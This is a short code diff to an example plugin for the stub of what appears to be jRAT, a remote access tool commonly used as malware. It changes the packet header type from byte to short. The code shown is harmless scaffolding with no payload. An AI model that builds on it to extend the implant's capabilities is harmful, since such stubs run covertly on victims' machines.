@@ -13,7 +13,7 @@ public class ExampleStubPlugin extends StubPlugin {
 	 * The packet header. Recommended -127 to 0 and 100 to 127. 0-100 jRAT
 	 * reserved.
 	 */
-	public static final byte HEADER = 126;
+	public static final short HEADER = 126;
 
 	/**
 	 * Should we print what is happening?
@@ -42,7 +42,7 @@ public class ExampleStubPlugin extends StubPlugin {
 	}
 
 	@Override
-	public void onPacket(byte header) throws Exception {
+	public void onPacket(short header) throws Exception {
 		if (header == HEADER) {
 
 			// Read title
